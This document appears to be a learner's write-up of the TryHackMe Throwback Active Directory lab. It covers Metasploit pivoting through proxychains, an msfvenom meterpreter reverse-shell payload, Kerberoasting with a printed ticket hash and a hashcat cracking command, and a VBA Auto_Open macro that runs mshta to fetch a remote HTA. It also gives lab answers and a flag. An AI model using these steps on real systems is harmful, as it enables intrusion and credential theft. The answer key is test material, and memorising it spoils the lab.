# Wallace and Gromit 

This section starts off with some hope and positiviy 
One thing to consider is the need to increase the resource limit for the terminal running Neo4j. 

```bash
ulimit -n 40000 
sudo neo4j console
# THEN goto localhost:7474
```

Firstly alot went wrong with trying to do this task. Various version of Sharphound don't work, the current one also does not and has not for months. I had alot of connectivity issue on my end and on THM Throwback and VM end. 

[Sharphound](https://github.com/BloodHoundAD/SharpHound/releases/tag/v1.0.3)

```powershell
  -c, --collectionmethods    (Default: Default) Collection Methods: Container, Group, LocalGroup, GPOLocalGroup,
                             Session, LoggedOn, ObjectProps, ACL, ComputerOnly, Trusts, Default, RDP, DCOM, DCOnly

  -d, --domain               Specify domain to enumerate

  -s, --searchforest         (Default: false) Search all available domains in the forest

  --stealth                  Stealth Collection (Prefer DCOnly whenever possible!)

  -f                         Add an LDAP filter to the pregenerated filter.

  --distinguishedname        Base DistinguishedName to start the LDAP search at

  --computerfile             Path to file containing computer names to enumerate

  --outputdirectory          (Default: .) Directory to output file too

  --outputprefix             String to prepend to output file names

  --cachename                Filename for cache (Defaults to a machine specific identifier)

  --memcache                 Keep cache in memory and don't write to disk

  --rebuildcache             (Default: false) Rebuild cache and remove all entries

  --randomfilenames          (Default: false) Use random filenames for output

  --zipfilename              Filename for the zip

  --nozip                    (Default: false) Don't zip files

  --trackcomputercalls       (Default: false) Adds a CSV tracking requests to computers

  --zippassword              Password protects the zip with the specified password

  --prettyprint              (Default: false) Pretty print JSON

  --ldapusername             Username for LDAP

  --ldappassword             Password for LDAP

  --domaincontroller         Override domain controller to pull LDAP from. This option can result in data loss

  --ldapport                 (Default: 0) Override port for LDAP

  --secureldap               (Default: false) Connect to LDAP SSL instead of regular LDAP

  --disablesigning           (Default: false) Disables Kerberos Signing/Sealing

  --skipportcheck            (Default: false) Skip checking if 445 is open

  --portchecktimeout         (Default: 500) Timeout for port checks in milliseconds

  --excludedcs               (Default: false) Exclude domain controllers from session/localgroup enumeration (mostly for
                             ATA/ATP)

  --throttle                 Add a delay after computer requests in milliseconds

  --jitter                   Add jitter to throttle (percent)

  --threads                  (Default: 50) Number of threads to run enumeration with

  --skipregistryloggedon     Skip registry session enumeration

  --overrideusername         Override the username to filter for NetSessionEnum

  --realdnsname              Override DNS suffix for API calls

  --collectallproperties     Collect all LDAP properties from objects

  -l, --Loop                 Loop computer collection

  --loopduration             Loop duration (Defaults to 2 hours - 00:02:00)

  --loopinterval             Add delay between loops (Example - 00:00:01 is 1 minute)

  --statusinterval           (Default: 30000) Interval in which to display status in milliseconds

  -v                         (Default: 2) Enable verbose output. Lower is more verbose

  --help                     Display this help screen.

  --version                  Display version information.
```

Unfortunately Sharphound.exe does not actually work and I have three days to finish Throwback [see issue](https://github.com/BloodHoundAD/SharpHound/issues/10). Hopeful this will be resolved at some point to try Bloodhound again on WS01 just in case you were suppose to only use Sharphound from there. Reset network still unable to get any response from WS01  Due to this I will recommend and watch this section done by [John Hammond](https://www.youtube.com/watch?v=ukFC48bzVSM). 

![justsad-one](Screenshots/johnHammond-one.png)

From the screenshots of Bloodhounbd usage on THM task 23, simply click on Find All Domain Admins, Find Kerberoastable Accounts...


## Sadly these answers are not from my work
```{toggle}
What service account is kerberoastable?
SQLSERVICE
What domain does the trust connect to?  
CORPORATE.LOCAL
What normal user account is a domain admin?
MercerH

TBH{b89d9a1648b62a7f2ed01038ac47796b} - Bloodhound account description flag on TBH-DC01
```

# With three heads you'd think they'd at least agree once
Due to all previous troublshooting and testing and now connectivity issues I had reset up the proxychains. 

```msfconsole

background
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.200.x.0
exploit
use auxiliary/server/socks_proxy
```

Much sadness continued:
![sadpartOne](Screenshots/sadness.png)
![sadpartTwo](Screenshots/sadnessmeterpreter.png)

Connection issues continued. So I reattempted this process again on but on the attack box with its different version of msfconsole and proxychains. Tip two of the day use:
```powershell
tasklist | findstr shell.exe
kill $PID
```
List old shells and kill them.
```msfconsole
vim /etc/proxychains/.conf # changed it to port 1080
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=tun0 LPORT=4444

# retransfered a new shell.exe and ran

background
use post/multi/manage/autoroute
set SESSION $SOMANYATTEMPTS
set SUBNET 10.200.x.0
exploit
#wait
use auxiliary/server/socks4a
exploit
```


```bash
root@ip-10-10-39-251:~# locate GetUserSPNs.py
/opt/impacket/examples/GetUserSPNs.py
/usr/local/bin/GetUserSPNs.py
root@ip-10-10-39-251:~# cd /opt/impacket/examples
root@ip-10-10-39-251:/opt/impacket/examples#
root@ip-10-10-39-251:/opt/impacket/examples# proxychains python3 GetUserSPNs.py -dc-ip 10.200.102.117 THROWBACK.local/HumphreyW:securitycenter -request
```

WOW!

![wowsa](Screenshots/finally-spns.png)

```bash
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

|S-chain|-<>-127.0.0.1:1080-<><>-10.200.102.117:389-<><>-OK
ServicePrincipalName                         Name        MemberOf  PasswordLastSet             LastLogon                   Delegation 
-------------------------------------------  ----------  --------  --------------------------  --------------------------  ----------
TB-ADMIN-DC/SQLService.THROWBACK.local:6792  SQLService            2020-07-27 16:20:08.552650  2020-07-27 16:26:43.628665             



|S-chain|-<>-127.0.0.1:1080-<><>-10.200.102.117:88-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.102.117:88-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.200.102.117:88-<><>-OK
$krb5tgs$23$*SQLService$THROWBACK.LOCAL$TB-ADMIN-DC/SQLService.THROWBACK.local~6792*$a68ba80e9ff585d5e8d0f69f4628445e$4b25e673215c52659fe7fb05146904dde495f23da1c26b91746407045bf95ad7754f4901378f93f1bd172d8c4173ad732dfd4e96ec3d9ce7d03e13e6a37e6836aa55736face00fbe1af3e5d50d38b663e3ef1efc788538442dcbcdc6b8587484ffb26fe67ba5d0f66964873b62e8fa4b81ef3016e0dcdef62367467f3163353807d740c3fb73e61f787c5f0618b78bbd8f1fc726d0ce8d33551e0ed1c7b2641e7b3b8b4a22744cc093c7f17642de631459bb3e6cd77702bb5b6d7361510484465a1579cdc2d2560eec03648d6077b342895473064332cc4afd52f69e4ec80278c26c3920a119e505f7faba5df26383fda6ca3713a9ccd7ad8f694190350b3d8a107f4c2f0bc5b94dadd036011b2f9401db58886929473887b6b9cab53944704a3d1b04d3031fdf3cfcf09bdd6cb911d8f198d74cff921051d4629c7797a02f5fcfe8668059d85c36cf58f6f61e1dc673313162970ed2050338cb9abc4496e6a73f7c439cc01abb214d64f8d25678db1d40502fb6c4cef2ac514784d2fd00c66cfd3982d04472d4a853cd9b306a8254407497b1c8e35c7daac73513651ca79ae99f583fe35bb92d2333ed5f1aa3884ac2bb50a36edda20731d21051a8564bb84a86698e2c4f7454dc437a69d025f23e81a65b8c12d0b027bd00dcacc11dbc3199929f74aaf606cf0f25c742afb972710d5e59c824e82521e470723b6df882fd6d50677b6a8f377ee524da018dcc2585a752f8c6cf839187d6a26570a376aee17c7e08898938aa119c7fc51503a11f2779f4f9e20095c1de1244f957359b547c342658d9a07bc198b32a91403fbb60bdb7b435785355790616d9c5d5e02d86c1829df863686b18ba826800cf599898462351a4199e89affedbe5717074eca080d1772b2b9ff0a92a8a69ca3346468ad0bb271e48727e6931086188f3079172639ae83ab59e119948d29f0b078d617fb78d0853e52cb8f57e917d3280699c2d8a17cf4191f7b4820eebf4ce7664b3faa79e6ac97fb7bb35d62c76800928567cf94aeed5e304d48428e1ae73620f280d32b325b98b66285cbe541212a1532ea9bf96bd8f575bd194a659e0aff299c9356cd49e3a813abf1952d89f7e7401546dcc0ee62d1ac28bb3857d98fee7210a9a19d4bfd9ca91b08c317f8e9bcd3be53f59f927bef0364ba5bc28dd99bbf0a7deb7d064777f40d98c9b52e906e66b1b665d0ec3cf78912c69c93ba82d4d57336e184739d9f687d646802e5bfb3bb50ebfd2e4c3c7a5d0160c3bbb0d7872bc7378fb8310573434f797ef1ea79ca4910ec441e44dc58866d3f0340fc9761158d873e5762595fc439ea0f44935e1438a56ba2138fcf797156eba1869f4966397bb7687021af52e731005e26114c00eefcc9a397160048caf735846da7c22c473be4b526859
```

Then to crack it with `hashcat -m 13100 -a 0 krbhash /usr/share/wordlists/rockyou.txt`


## Answers
What account was compromised by kerberoasting?
```{toggle}
SQLService
```
What password was cracked from the retrieved ticket?
```{toggle}
mysql337570
```


# Word to your Mother

```msfconsole
use exploit/windows/misc/hta_server
set lport 3333
```

```vb
Sub MyMacro()
	PID = Shell("mshta.exe https://IP:8080/c9496fz.hta")
End Sub

Sub Auto_Open()
    MyMacro
End Sub
```